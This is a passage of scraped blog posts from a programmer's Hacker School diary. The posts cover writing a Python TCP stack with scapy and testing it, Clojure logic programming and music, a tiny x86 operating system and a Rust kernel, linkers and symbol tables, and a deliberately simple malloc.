self._send_ack()\n    elif \"F\" in recv_flags:\n        if self.state == \"ESTABLISHED\":\n            self.seq += 1\n            self.state = \"LAST-ACK\"\n            self._send_ack(flags=\"F\")\n        elif self.state == \"FIN-WAIT-1\":\n            self.seq += 1\n            self._send_ack()\n            self._close()\n    elif \"A\" in recv_flags:\n        if self.state == \"SYN-RECEIVED\":\n            self.state = \"ESTABLISHED\"\n        elif self.state == \"LAST-ACK\":\n            self._close()\n    else:\n        raise BadPacketError(\"Oh no!\")\n \n\n This solves a bunch more problems than the first function. In particular, it \n\n \n Ignores packets with the wrong sequence number \n Updates the  last_ack_sent  with the next sequence number that we’re expecting \n \n\n Good things: \n\n \n If I’m in “ESTABLISHED” and get a “FA”, it’s fairly easy to see what’s going to\nhappen in the giant if statement \n \n\n Bad things: \n\n \n The cases aren’t all mutually exclusive, so the order matters.  :[ \n\n Each one is a seemingly random combination of  self.seq += 1 ,\n self._send_ack() ,  self._close() , and a change to  self.state . It’s hard to\nmake sure the whole thing is right without a ton of unit testing. \n \n\n My confusion about this function largely reflects my confusion about TCP at\nthis point, I think. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/07/day-24-unit-testing-this-tcp-library/", "title": "Day 24: Unit testing this TCP library", "content": "\n      Today in morning checkins I realized I’d been having a lot of trouble\ntesting this TCP library yesterday, because all of the tests needed to\nuse the network. \n\n So now I have better unit tests which don’t need to sleep and use the\nnetwork! I did this by adding a  MockListener  class which takes\npackets. \n\n The actual sending-packets-over-the-network tests no longer pass,\nbecause right now I’m just writing to the mock unit tests. But now the\ntests are \n\n a) faster (0.009 seconds instead of 5 or 10), and\nb) deterministic (they do the same thing every time) \n\n So this is  much  better. The implemention is still pretty much a\nscattered mess. I tried to deal with replies to packets and completely\nfailed. I’m at the point where I have no idea of how to implement this\nTCP state machine. \n\n My plan for fixing this is to read  this tiny implementation \nof TCP – it’s about 1000 lines of C. Right now I have about 100 lines\nof Python,  and  I don’t even have to unpack the packets or anything\nbecause scapy does that. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/13/day-27-magic-testing-functions/", "title": "Day 27: Automatically testing changes in state! Visualizing my Git workflow! Floats!", "content": "\n      ##Testing state changes! (overriding  __setattr__ ) \n\n This morning I worked with  Allison , one of the HS\nfacilitators. I have previously mentioned that Allison is amazing – she’s\nworking on this super fun Python bytecode interpreter\ncalled  byterun  that\nI  blogged about a few weeks ago . \n\n Today we worked a bit on testing this TCP client that I’m writing. As a\nconnection happens, the client goes through a series of internal states\n( \"CLOSED\" ,  \"SYN-SENT\" ,  \"ESTABLISHED\" , etc.), and I wanted to check\nthat it was going through the right states. \n\n Allison had the amazing idea of subclassing my socket class to log every\ntime I set the  state  attribute. Here’s what that looks like: \n\n from tcp import TCPSocket\n\nclass LoggingTCPSocket(TCPSocket):\n    def __init__(self, listener, verbose=0):\n        self.received_packets = []\n        self.states = []\n        super(self.__class__, self).__init__(listener, verbose)\n\n    def handle(self, packet):\n        self.received_packets.append(packet)\n        super(self.__class__, self).handle(packet)\n\n    def __setattr__(self, attr, value):\n        if attr == 'state':\n            self.states.append(value)\n        super(self.__class__, self).__setattr__(attr, value)\n \n\n So we override  __setattr__  to log the value every time we change\n self.state . This also made me want to learn Python 3 – apparently this\n super()  business is much nicer is Python 3. \n\n This means I can then write a test saying \n\n assert conn.states == [\"CLOSED\", \"SYN-SENT\", \"ESTABLISHED\", \"LAST-ACK\", \"CLOSED\"]\n \n\n Which is super nice. <3 \n\n I also talked with Mary about redesigning the  handle()  function I complained\nabout yesterday, but I still haven’t had the courage to change it again. It\nwill happen! \n\n ##Floats! \n\n In the afternoon, there was a fantastic lecture by  Stefan Karpinski  about\nfloats. The key thing I learned there is that there are a finite amount of\n64-bit floats (2^64 of them!). Which is obvious in retrospect, but I hadn’t\nthought about it before. \n\n And there are always 2^52 floats between 2^n and 2^(n+1). Which is super nice!\nIn particular, this means that the floats between 2^52 and 2^53 are the same as\nthe integers between 2^52 and 2^53. \n\n We talked about gradual underflow and epsilons and rounding and it was\nfantastic. knowledge++. \n\n ##Visualizing Git workflows \n\n I talked to  Philip Guo , the resident for this week, for\na while. We played with the idea of taking people’s history files and using them\nto \n\n \n teach novices (so they can see what an expert workflow looks like) \n help tool authors (so they can see how people are actually using their tools) \n help me understand how I am using a tool \n let me see how Wes McKinney uses pandas (celebrity history files! :D) \n \n\n We talked in particular about looking at \n\n \n Git workflows (because there are tons of options) \n command line options in general for complex commands ( http://explainshell.com/  is great, but it doesn’t tell you which options you  should  be using) \n IPython magics \n IPython histories more generally, since they’re all stored. \n \n\n I find it really interesting how I learn about command line tools largely\nthrough social interactions and folklore, and rarely by reading documentation\nor man pages. \n\n A great example of a novice-teaching session\nis  this part of my history file , from\nwhen I was pairing with Jari who understands tools like netstat and tcpdump. I\ndon’t necessarily remember what all the options do, but since I have that\nhistory I can refer back to it and read up on  -a ,  -n ,  -u , and  -p , which\nis much more manageable than reading the  netstat  man page. \n\n After we talked, I put together a graph of which Git commands I transition to\nfrom other commands. The thickness of the arrow indicates how many times I move\nfrom one command to another. There isn’t really enough data to make conclusions\nfrom this, but it’s neat. \n\n You can  look at the notebook  and try it\nout yourself. Here’s the picture! \n\n \n\n ##Takeaway \n\n I need to talk to more people. I learn more when I talk to more people. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/20/day-31-logic-programming-pretty-music/", "title": "Day 31: Binary trees with core.logic!", "content": "\n      TODAY WAS FUN. \n\n In the morning I paired with  Will Byrd  on some\nlogic programming. We worked on implementing binary search trees with\n core.logic  in Clojure. We got somewhere! My favorite thing about\nlogic programming is that all the functions end with ‘o’. \n\n Here is what our code looked like: \n\n (ns core-logic-search-tree.core\n  (:refer-clojure :exclude [==])\n  (:require\n   [clojure.core.logic.fd :as fd]\n   [clojure.core.logic :refer [== fresh conde run]]))\n\n(def my-tree\n  [:value 6\n   :left [:value 4\n          :left [:value 3 :left nil :right nil]\n          :right [:value 5 :left nil :right nil]]\n   :right nil])\n\n(defn containso [tree x]\n   (fresh [v l r]\n           (fd/in v (fd/interval 0 2000))\n           (== tree [:value v :left l :right r])\n           (conde\n            [(fd/== v x)]\n            [(fd/> v x) (containso l x)]\n            [(fd/< v x) (containso r x)])))\n \n\n Then we could run \n\n (run 1 [q] (containso my-tree 3))\n \n\n and it would say that the tree contains 3. Which is okay! But the\nreally fun part is that you can run it “backwards” and ask \n\n (run 10 [q] (containso q 3))\n \n\n and get 10 trees that contain 3: \n\n (\n[:value 3 :left _0 :right _1]\n[:value 4 :left [:value 3 :left _0 :right _1] :right _2]\n[:value 0 :left _0 :right [:value 3 :left _1 :right _2]]\n[:value 5 :left [:value 3 :left _0 :right _1] :right _2]\n[:value 6 :left [:value 3 :left _0 :right _1] :right _2]\n[:value 1 :left _0 :right [:value 3 :left _1 :right _2]]\n[:value 7 :left [:value 3 :left _0 :right _1] :right _2]\n[:value 8 :left [:value 3 :left _0 :right _1] :right _2]\n[:value 2 :left _0 :right [:value 3 :left _1 :right _2]]\n[:value 9 :left [:value 3 :left _0 :right _1] :right _2])\n \n\n If you inspect carefully, you will see that those are all binary trees\nand they all contain 3! =) \n\n I am also doing magical music magic with Lyndsey, but that will have\nto wait until tomorrow \n\n"},
{"url": "https://jvns.ca/blog/2013/11/25/day-33-how-to-make-music-with-clojurescript/", "title": "Day 33: How to make music with ClojureScript", "content": "\n     \n\n I am working on a small project to practice\n change ringing  with\nClojureScript. \n\n As always when starting a new project I have been consulting\napproximately a million resources to get started. So I thought I’d\ncollect them all together in one place instead of searching for them\nover and over forever. \n\n Getting started with ClojureScript \n\n \n Empty ClojureScript project, with instructions ,\nfrom  Mary \n CLJSFiddle , for trying out ClojureScript\nsnippets \n Explanation of cljs/js interop , from\n Zach \n \n\n Web Audio \n\n There’s a newish API for synthesizing sound in the browser called the\nWebAudio API. \n\n \n Some demos \n Very cool player piano app \nby Liam Griffiths, a Hacker Schooler in my batch. You will have to\nrun it on your computer but it will be worth it. \n Hum , a small ClojureScript wrapper\naround the WebAudio API. If you want to test if it works in your\nbrowser, try\n this CLJSFiddle .\nIt should make an annoying noise when you run it.. \n \n\n Sound samples \n\n If you don’t want to synthesize music, there are tons of samples on\n freesound.org \n\n \n Freesound API documentation \n Get a Freesound API key . It says\n“Apply”, but it gives it to you automatically. \n freesound.js , a JS library\nfor working with freesound \n IDs for a set of piano samples ,\nfrom the Overtone project. \n JSFiddle demoing the Freesound API .\nScroll to the bottom to see the actual code; I copied all of  freesound.js \ninto it. It should make a piano sound when you run it.\n \n \n\n"},
{"url": "https://jvns.ca/blog/2013/11/27/day-34b-wrapping-up-the-tcp-stack/", "title": "Day 34b: Writing curl using my TCP stack", "content": "\n     \n\n Today I spent a bunch of time writing READMEs for the projects I’ve\nbeen working on at Hacker School, and putting together a\n project page  with screenshots and\nexplanations. \n\n While doing that, I discovered that it was impossible to explain my\n TCP fun  project because it was,\ner, mostly not working. So I fixed it up and wrote a finicky and\nunreliable version of  curl  using it, which made me happy. \n\n The  curl  example is quite finicky – it uses ARP spoofing to bypass\nthe kernel’s TCP stack, which sometimes results in it just Not\nWorking. Running it a few times sometimes fixes this problem. I found\nthat if I ran it 5 times then it would work. Mostly. \n\n I ran it using \n\n $ git clone http://github.com/jvns/teeceepee\n$ cd teeceepee\n$ sudo python examples/curl.py 10.0.4.4 example.com\n \n\n You’ll notice that I’m supplying an extra local IP address, which\nseems like a weird thing to give  curl . The reason for this is that\nit needs to bypass the kernel, since normally the TCP one has there\nwill intercept any incoming packets and reset the connection. So we\nlisten on a fake IP address and send gratuitous ARPs to the router. \n\n This IP address needs to be in my subnet and should not belong to\nanyone else, because it would do bad things to them. \n\n Features \n\n \n Can connect to hosts, send packets, and reassemble the replies in\nthe correct order \n Will ignore out-of-order packets \n \n\n Missing features \n\n \n Breaking up sent data into more than one packet. \n Resending packets that haven’t been ACKed \n Handling more than one incoming connection at once \n bind()  hasn’t been tested in the wild at all, just unit tested. So\nit probably doesn’t work. \n Basically it is a marginally acceptable client and a totally\nineffective server \n \n\n Difficulties \n\n \n It needs to run as root because it needs to use raw sockets. \n TCP stacks aren’t really  supposed  to start and stop. In\nprinciple this should really run as a daemon, but it doesn’t. \n It needs to do ARP spoofing in order to receive any packets at all,\nas I explained earlier \n It’s slow, because Python. If you watch it in Wireshark, it does a\nhilarious thing where it gets backed up sending ACKs and then sends\na load of ACKs at the end and takes forever to close the connection. \n Sometimes the ARP spoofing and packet sniffing doesn’t quite work.\nUsually if I run it 5 times it will work. \n \n\n"},
{"url": "https://jvns.ca/blog/2013/11/12/day-25-ack-all-the-things/", "title": "Day 25: ACK all the things", "content": "\n      Today I worked some more on my TCP stack! I read a bit of Stevens’\n TCP/IP Illustrated ,\nwhere I obtained exactly one insight: every TCP packet I send (except\nfor the initial SYN) can have the ACK flag set. \n\n This simplified my packet-sending code a lot – I realized I can construct\nbasically every packet the same way, except for the flags and the payload. Now\nI can write \n\n def _send_syn(self):\n    self._send(flags=\"S\")\n    self.state = \"SYN-SENT\"\n \n\n instead of \n\n def send_syn(self):\n    syn_pkt = self.ip_header / TCP(dport=self.dest_port, sport=self.src_port, flags=\"S\", seq=self.seq)\n    self.listener.send(syn_pkt)\n    self.state = \"SYN-SENT\"\n \n\n Right now the way I’m handling ACKs is basically to send an ACK for every\npacket I receive. This isn’t really efficient (because if I’m receiving tons of\npackets really fast it would make sense to acknowledge less often). But it is\nnot incorrect, which is all that I’m going for. \n\n I also decided that I want to be able to be a TCP server as well as a TCP\nclient. So I started writing  bind() . Here it is so far: \n\n def bind(self):\n    pass\n \n\n Seriously I did not ever think about how  bind()  works before. It has to\nmanage multiple connections! And keep a queue! What am I supposed to do when\npeople send me packets all at once? Just ignore them until I have time? I don’t\nget it. \n\n Testing is fantastic. I love testing. I refactored pretty much all the code today in\n this commit .\nThe code still works, because tests. =D \n\n However writing tests kind of sucks because it takes forever. Next up: writing\ntests for \n\n \n receiving packets out of order \n receiving duplicate packets \n being on the server side of the TCP handshake \n \n\n"},
{"url": "https://jvns.ca/blog/2013/11/18/day-29-trying-out-emacs/", "title": "Day 29: Trying out Emacs!", "content": "\n      At Hacker School I’ve been watching all the Lisp wizards with their\nemacs attached to magical running Lisp processes where they can change\nand reload the code in real time. And I am officially jealous. \n\n So I am trying out emacs! Tomorrow I will write Clojure and\nuse  Overtone  to generate music and it\nwill be wonderful. \n\n And there was a fantastic talk today by  Will Byrd \nabout logic & relational programming where he showed how to\nautomatically generate quines and it was mindblowing and fun. So I\nthink I’m going to end up playing with Clojure’s core.logic a bit,\nbecause fun. \n\n Definitely using evil mode, though, because I haven’t spent years\npracticing vim keybindings for nothing =). \n\n"},
{"url": "https://jvns.ca/blog/2013/11/19/day-30-making-music-in-clojure-with-overtone/", "title": "Day 30: Making music in Clojure with Overtone. Clojure bugs with laziness! Fun!", "content": "\n      Today I started using a lovely Clojure library called\n Overtone , for generating music. It is\npretty easy to use and a fun time. On the box it says that you need to\nbe “comfortable with” Clojure, the basics of music theory, and the\nSupercollider audio synthesis environment. I do not know any of these\nthings and I successfully made sounds by copying and changing\nexamples. \n\n I wrote a tiny bit of code to play rhythms. And I ran into my first\nclojure bug! I defined a function  side-effecty-thing , and ran \n\n (map side-effecty thing sequence)\n \n\n And that ran fine. It made sounds! \n\n But then I tried something like \n\n (def new-function [time]\n    (map side-effecty thing sequence)\n    (apply-at (+ time 4) '#new-function (+ time 4)))\n \n\n which basically does the  (map side-effecty-thing)  and then calls\nitself recursively, later. And this did not make sounds. And I was\nTOTALLY CONFUSED, because, it says  (map side-effecty-thing)  in it!\nIt should make sounds! \n\n But then Travis explained that  map  is lazy and not actually\nappropriate if you want the function you are running to  happen  right\naway. \n\n So what I actually wanted to use was  doseq , which will let you\nactually make the side-effecty things happen when you ask for them.\nAnd it throws away the result, which is good because I didn’t actually\nwant the result. Yay! \n\n ALSO EMACS IS ENJOYABLE. Paredit is nice. I am in fact not using Evil\nmode. I am using Normal Emacs, with a few packages: \n\n \n Graphene , to make\neverything a bit prettier \n clojure mode, clojure test mode, and cider, for Clojure fun.\nApparently cider is the thing that people use now and it is the same\nas nRepl. \n \n\n This is a strange and confusing world, humans! I no longer know how to\nwrite if statements without looking it up! Very Exciting Times! \n\n"},
{"url": "https://jvns.ca/blog/2013/11/21/day-32-magical-orchestra/", "title": "Day 32: Magical Orchestra!!!", "content": "\n      This week  Lyndsey  and I worked on a\n ★★★ Magical Orchestra ★★★ \nin Clojure. \n\n The idea behind a  ★★★ Magical Orchestra ★★★  is that you go to\n http://my-ip:8080/client.html , and then you get a page that looks like\nthis: \n\n \n\n Then a sound plays on my computer! Like a crow, or a cowbell. \n\n So at presentations we plugged my computer into a speaker and let\neveryone make noise. It was delightful. \n\n If you are so inclined, you can have your very own magical orchestra\nby cloning the repo above, installing Leinengen, and running  lein run . \n\n"},
{"url": "https://jvns.ca/blog/2013/11/26/day-34-the-tiniest-operating-system/", "title": "Day 34: The tiniest operating system", "content": "\n      One of my as-yet-unrealized goals for Hacker School is to write an\noperating system, at least a tiny one. \n\n Today I decided to actually start in earnest, because this operating\nsystem isn’t going to write itself! I’ve decided to write an OS for\nx86, because I like the idea of being able to run it on my computer in\nreal life. \n\n I immediately found a super-fantastic resource:\n MikeOS , which has\nreally simple instructions. The only issue I had with them was that I\nhad to run  kvm  instead of  qemu  to get it to run in the emulator. \n\n If you install  build-essential ,  nasm , and  qemu , and clone\n this gist , you too will have\nthe tiniest operating system! \n\n So far all I’ve learned is how to use\n a particular BIOS interrupt handler ,\nwhich lets me write characters to the screen and change the background colour. \n\n Here’s what my OS looks like so far. It prints something, and makes\nthe background a pinkish colour. \n\n \n\n"},
{"url": "https://jvns.ca/blog/2013/11/29/writing-an-os-using-rustboot-and-rust-core/", "title": "Writing a kernel using rustboot & rust-core", "content": "\n      Here I am again using the word “kernel” in a fairly broad sense :) \n\n So today  Lindsey Kuper , one of\nthe residents for next week, came by Hacker School! I spent some time\na while ago trying to learn some Rust, but got discouraged by the\nscary pointers and ran away. \n\n But today she pointed out that Rust is for systems programming, and\nright now I  am  trying to write an operating system, and this would\nbe the perfect time to pick it up again! \n\n So I started playing with\n rustboot , which is a 32-bit\nkernel which turns the screen red and hangs. So far I’ve made some\nminor changes – it now turns the screen  green  and hangs. \n\n But slightly more seriously, I also added a function to print\ncharacters to the screen! \n\n \n\n Here’s the new code I added to do that: \n\n unsafe fn putchar(x: u16, y: u16, c: u8) {\n    let idx : uint = (y * VGA_WIDTH * 2 + x) as uint;\n    // 0xb8000 is the VGA buffer\n    *((0xb8000 + idx) as *mut u16) = make_vgaentry(c, Black, Yellow);\n}\n\nfn make_vgaentry(c: u8, fg: Color, bg: Color) -> u16 {\n    // Details of how VGA colours are stored\n    let color = fg as u16 | (bg as u16 << 4);\n    return c as u16 | (color << 8);\n}\n\nunsafe fn write(s: &str, x: u16, y: u16) {\n    let bytes : &[u8] = to_bytes(s);\n    let mut ix = x;\n    let mut iy = y;\n    let mut i = 0;\n    for b in core::slice::iter(bytes) {\n        putchar(ix, iy, *b);\n        if (ix > VGA_WIDTH * 2) {\n            // line wrap\n            ix = ix - VGA_WIDTH * 2;\n            iy += 1;\n        }\n        i += 1;\n        ix += 2;\n    }\n}\n\n\n#[no_mangle]\npub unsafe fn main() {\n    clear_screen(Green);\n    write(\"Hello!aaa\", 2, 3);\n}\n \n\n I like that I can write a loop like  for b in core::slice::iter(bytes)\n{ . I still don’t know how string length is determined – it seems\nlike instead of having null-terminated strings, Rust stores the size\nseparately. I think. \n\n It’s nice that I can write code like this without having an OS in the\nbackground. As I mentioned before, there were quite a few gotchas –\nfor example, when I was trying to get the iterator to work, I got the\ncryptic error message  error: unreachable pattern , which meant that I\nneeded to add  use core::option::None . \n\n In all to get iterators to work I need to add: \n\n use core::mem::transmute; // for to_bytes()\nuse core::slice::iter; // for the iterator\nuse core::iter::Iterator; // for the loop\nuse core::option::{Some, Option, None}; // for the loop\nmod core;\n \n\n This small amount of accomplishment wouldn’t have been remotely\npossible without the help of the lovely people on the #rust IRC\nchannel – I had tons of issues using freestanding rust and rust-core,\nand the  rust-core maintainer  answered\nevery single one of my questions. <3. \n\n If you wanted to do this yourself, you could do something like: \n\n \nsudo apt-get install qemu nasm\ngit clone https://github.com/jvns/rustboot.git\ncd rustboot\ngit checkout 1e0f2b02f45096e5300faf9e\ngit clone https://github.com/thestinger/rust-core.git ~/rust-core\nln -s ~/rust-core/core .\nmake run\n \n\n Oh! Also! That code prints 9 characters to the VGA buffer correctly,\nbut if I try printing 10 characters, it doesn’t work. I have no idea\nwhy. That will be for tomorrow. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/29/what-happens-when-you-run-a-unix-program/", "title": "What happens when you run 'Hello, world'", "content": "\n     \n\n So today I experimented with a new way of learning – I wanted to\nunderstand what happens when I run a “hello world” program, but I\nwasn’t at Hacker School. So I wrote down my current understanding and\na bunch of questions and asked Twitter! \n\n if anyone has too much time and operating system knowledge, I'd love comments and \"well, actually\"s on  https://t.co/YqSyV5ap4Q — Julia Evans (@b0rk)  November 28, 2013 \n \n\n People left me tons of helpful comments in\n the gist , which made me\nreally happy. \n\n I’m not going to reprise all of the discussion here, but here’s an\nincomplete summary of what needs to happen when a kernel runs an\nexecutable. If you’re interested, definitely check out\n the gist . \n\n The question: If I were an OS, what would I need to do to run “Hello, world?” \n\n The original program was \n\n #include <stdio.h>\nint main() {\n    printf(\"Hello!\\n\");\n}\n \n\n and I statically compiled it by running  gcc -static -o hello hello.c .\nSo we don’t have to worry about dynamic linking or anything. (I very\nmuch enjoyed\n this guide to linkers ,\ntangentially) \n\n Step 0: Simplify the program a bit \n\n The first suggestion I got was to make it a bit easier by using\n write()  instead of  printf() . \n\n Running  strace ./hello  tells me all the system calls that happen,\nincluding the  write()  system call: \n\n write(1, \"Hello world!\\n\", 13)\n \n\n So we can simplify this program down to \n\n int main() {\n  write(1, \"Hello world!\\n\", 13);\n}\n \n\n which removes the  #include  and some of the system calls.  printf() \nis a pretty complicated function, so it’s better to not use it. \n\n Now we can get down to the actual business of describing what happens\nwhen the program executes! These are not in any particular order. \n\n Load the  code (“text”)  into memory \n\n In the binary there are a bunch of assembler instructions. These need\nto be loaded into memory. \n\n Load the  data segment  into memory \n\n A program might also have initialized and uninitialized global\nvariables. These need a place in memory. \n\n I’d need to zero out the  BSS  out\nhere for sure. \n\n Set up the heap and stack \n\n Programs need a heap and a stack. \n\n Once these three things are done, we have the program’s “address\nspace” in memory. This looks something like this (thanks to\n @danellis  for the diagram!) \n\n \n+---------------+\n|    Stack      |\n|      |        |\n|      v        |\n+---------------+\n:               :\n+---------------+\n|      ^        |\n|      |        |\n|     Heap      |\n+---------------+\n|     Data      |\n+---------------+\n|     Code      |\n+---------------+\n \n\n I’m still really not sure about the details of what this set up looks\nlike – people talk a lot about virtual memory and I don’t know how I\nwould implement that at all or if I would have to implement it. \n\n Handle system calls \n\n User space programs interact with the kernel through “system calls”. \n\n If I run  strace -o hello.out ./hello , I get this list of all the\nsystem calls that happen when running  ./hello : \n\n execve(\"./hello2\", [\"./hello2\"], [/* 59 vars */]) = 0\nuname({sys=\"Linux\", node=\"kiwi\", ...})  = 0\nbrk(0)                                  = 0xca9000\nbrk(0xcaa1c0)                           = 0xcaa1c0\narch_prctl(ARCH_SET_FS, 0xca9880)       = 0\nbrk(0xccb1c0)                           = 0xccb1c0\nbrk(0xccc000)                           = 0xccc000\nwrite(1, \"Hello world!\\n\", 13)          = 13\nexit_group(13)                          = ?\n \n\n I don’t think I have to worry about the first two system calls, since\nthe first one is definitely called by my shell. \n\n The  brk  system call is about moving the “program break” to allocate\nmemory. I’m not totally sure why it needs to allocate memory, but it\ndoes. \n\n The  write  system call I definitely feel like I could handle – I\nfound an  example on the OSDev wiki \nof how to write to a VGA buffer, so that could work. \n\n I’m guessing  exit_group  is about quitting the program, so I’d have\nto do some cleanup or something. I have no idea what  arch_prctl  is. \n\n I’m hoping to actually do some of this in the coming week at Hacker\nSchool. I’ve been pointed to the\n OSDev wiki  which has all kinds of\nfantastic explanations and tutorials. \n\n"},
{"url": "https://jvns.ca/blog/2013/11/30/videos-from-pydata-nyc-are-up/", "title": "Videos from PyData NYC are up!", "content": "\n      The  videos from PyData NYC  are now\nup. In particular, you can now watch the\n video for my IPython Notebook + pandas tutorial .\nI’m not sure how well it translates to video, since it was a pretty\ninteractive tutorial and I spent a lot of the time running around in\nthe audience answering questions. The\n IPython Notebook \nand the\n same notebook on Wakari  should\nbe useful, though. \n\n Some talks I enjoyed at PyData NYC: \n\n Probabilistic Data Structures for Realtime Analytics \n  by  Martin Laprise \n\n I didn’t know too much about probabilistic data structures before this\ntalk. He explained how Bloom filters work and when it would be\nappropriate to use them, and now I know! There’s also an\n IPython Notebook . \n\n My main takeaway from this talk was that you can use Bloom filters to\ndescribe a huge amount of data, but not an  unlimited  amount of data\n– the size of your Bloom filter depends on how much data you’re going\nto put into it. He also described how to set up a Bloom filter where\nthe elements expire after a certain amount of time. \n\n IPython - The Attributes of Software and How They Affect Our Work \n  by  Brian Granger \n\n I wasn’t able to make it to this talk, but everyone was abuzz about\nit on Twitter afterwards, so I’m definitely going to watch the video. \n\n Python at Datadog - Building High-Volume Data Systems in the Python Ecosystem \n\n At 25:27, he demos how Cython has a tool to automatically colour your\nCython code and show how optimized it is. Whoa. That is the kind of\nstuff I go to conferences to learn :) \n\n I didn’t make it to very many talks at the conference, so I’d love to\nhear about what else I missed. \n\n"},
{"url": "https://jvns.ca/blog/2013/12/01/how-to-call-rust-from-assembly/", "title": "How to call Rust from assembly, and vice versa", "content": "\n     \n\n In the last few days I’ve been working on a kernel in Rust. This has\nentailed learning about linkers and foreign function interfaces and\nall kinds of things. \n\n To learn this stuff, I read\n this guide to linkers , looked\nat the\n Rust foreign function interface tutorial ,\nand asked a million questions on the Rust IRC channel. \n\n Disclaimer: even more than usual, some of this is probably wrong. \n\n So. Linkers. \n\n I have assembly functions that I need to call from Rust, and Rust\nfunctions I need to call from assembly. Everything gets compiled to\nassembly eventually, so this is a reasonable thing to do. As far as I\nunderstand it, a function call is just jumping to an address in memory\nand putting some stuff on the stack and in registers, and the code\ndoesn’t care at all if that address in memory comes from Rust or C or\nassembly or what. \n\n Some terminology: \n\n \n A  calling convention  is about how exactly the stuff gets put on\nthe stack and in the registers. Rust and C have different calling\nconventions. \n An  object file  is what you get when you compile some source code\nto a library (using  gcc  or  nasm  or  rustc ). It ends in  .o \n A  symbol  is an identifier in a program, like a variable or\nfunction name. Object files have a  symbol table  and can refer to\nsymbols in other object files. \n A  linker  (like  ld ) combines several object files into one\nbinary, matching up their symbol tables. \n \n\n Calling Rust from assembly \n\n So here’s an assembly function that calls a Rust function: \n\n global  _interrupt_handler_kbd_wrapper\nextern _interrupt_handler_kbd\n\n_interrupt_handler_kbd_wrapper: \n    pushad\n    call    _interrupt_handler_kbd\n    popad\n    iret\n \n\n extern  says that  _interrupt_handler_kbd  isn’t actually defined in\nthis file, but that  nasm  shouldn’t worry about it when assembling –\nit’ll be fixed later. This is like a function declaration in C, except\nwithout the types. \n\n I haven’t tested this yet so there’s probably something wrong with it.\nBut it compiles. \n\n Calling assembly from Rust \n\n External functions are defined in Rust again using the  extern \nkeyword (sound familiar? =D). \n\n I need to get the address of the  _interrupt_handler_kbd_wrapper  and\n idt_load  functions in Rust, so I defined them like this: \n\n extern {\n    fn _interrupt_handler_kbd_wrapper ();\n    fn idt_load(x: *IDTPointer);\n}\n \n\n You’ll notice that I needed to specify the types of the function’s\narguments. These don’t have return values, but if they did I’d need to\nwrite those types too. \n\n The type of  _interrupt_handler_kbd_wrapper  is  extern \"C\" unsafe\nfn() . That’s pretty complicated, but let’s break it down: \n\n \n extern  means it’s defined in another object file. \n \"C\"  is the  calling convention  which we mentioned before. \n We have no idea what the function could be doing, so it’s  unsafe . \n \n\n Then I can just call my  extern  functions like normal Rust functions. \n\n Putting it together: the linker \n\n I have a file named  linker.ld  that contains: \n\n ENTRY(start)\nOUTPUT_FORMAT(binary)\n\nSECTIONS {\n    . = 0x7e00;\n\n    .text : {\n        *(.text)\n    }\n}\n \n\n Then I run \n\n i386-elf-ld -T linker.ld runtime.o main.o isr_wrapper.o -o main.bin \n\n where  main.o  is my Rust file and  isr_wrapper.o  is my assembly\nfile. You’ll notice that now they have a  .o  extension – now they’re\n“object files” and they’re all assembly code. \n\n This  ld  command puts  main.o ,  runtime.o , and  isr_wrapper.o \ntogether into one binary. Basically this matches up symbols with the\nsame name and makes it work. If an  extern  function I declare in a\nfile doesn’t exist, then I’ll get a linker error like this: \n\n main.o: In function `main':\nmain.rc:(.text+0x1db): undefined reference to `_interrupt_handler_kbd_wrapper'\n \n\n But this kind of linker error isn’t scary any more! It just means that\n _interrupt_handler_kbd_wrapper  isn’t in the symbol table of any of\nthe other object files we’re linking. \n\n How to look at an object file’s symbol table \n\n To see the symbols that are defined in  isr_wrapper.o , I can use\n objdump  like this: \n\n bork@kiwi ~/w/h/rustboot> objdump -t isr_wrapper.o\n\nisr_wrapper.o:     file format elf32-i386\n\nSYMBOL TABLE:\n00000000 l    df *ABS*  00000000 isr_wrapper.asm\n00000000 l    d  .text  00000000 .text\n00000000         *UND*  00000000 _interrupt_handler_kbd\n00000000 g       .text  00000000 _interrupt_handler_kbd_wrapper\n00000008 g       .text  00000000 idt_load\n \n\n You can see here that I’ve defined  _interrupt_handler_kbd_wrapper \nand  idt_load , but that  _interrupt_handler_kbd  is undefined and\nneeds to be defined in another file. \n\n You can also use  objdump -T  to look at a dynamically linked  .so \nfile’s symbol table. We’re not talking about dynamic linking today =).\nFor example  objdump -T  /usr/lib32/libm.so  shows me the math\nlibrary’s symbol table. COOL. \n\n That’s all! \n\n \nYou may notice that it doesn’t really make sense to call\n _interrupt_handler_kbd_wrapper  from Rust. I’m not actually calling\nit, I just need to refer to it so I can store its address.\n \n\n"},
{"url": "https://jvns.ca/blog/2013/12/10/day-39-i-wrote-a-malloc/", "title": "Day 39: Writing malloc wrong, for fun", "content": "\n      My major achievement for today is writing the following five lines of\ncode: \n\n let a: ~u8 = ~('A' as u8);\nstdio::putc(*a);\nlet b: ~u8 = ~('B' as u8);\nstdio::putc(*a);\nstdio::putc(*b);\n \n\n and having them do the wrong thing. One would normally expect this to\nprint “AAB”. But for me, right now, until I stop goofing off, it\nprints “ABB”. Why is that? \n\n Well, it’s because my  malloc  implementation looks like this: \n\n static mut base: uint = 0x200000;\npub extern \"C\" fn malloc(len: uint) -> *mut u8 {\n    unsafe {\n        let ret: uint = base;\n        return base as *mut u8;\n   }\n}\n \n\n This means that every time I allocate memory, I get the same pointer\nback, and so  a  and  b  will always be equal no matter what. And for\nthat matter any variable I create will always have the same value.\nThis is of course a terrible idea in real life, but it is  really\nfun . \n\n Here’s my real  malloc  function (that causes the above code to print\n“AAB”, like it should): \n\n pub extern \"C\" fn malloc(len: uint) -> *mut u8 {\n    unsafe {\n        let ret: uint = base;\n        base += len + size_of::<uint>();\n\n        // Align next allocation to 4-byte boundary.\n        if(base % 4 != 0) {\n            base += 4 - (base % 4);\n        }\n\n        *(base as *mut uint) = len;\n\n        return (ret + size_of::<uint>()) as *mut u8;\n    }\n}\n\npub extern \"C\" fn free(ptr: *mut u8) {\n    // meh.\n}\n \n\n The hardest part about this was not actually writing  malloc . Writing\n malloc  is easy, as long as you never need to free memory. I also\njust wrote this by copying it from a C implementation. You just need\nto keep a counter and keep incrementing it. \n\n The hard part was getting the type of the function right, because Rust\n:). This is entirely made up for by being able to play silly memory\ngames. \n\n"},
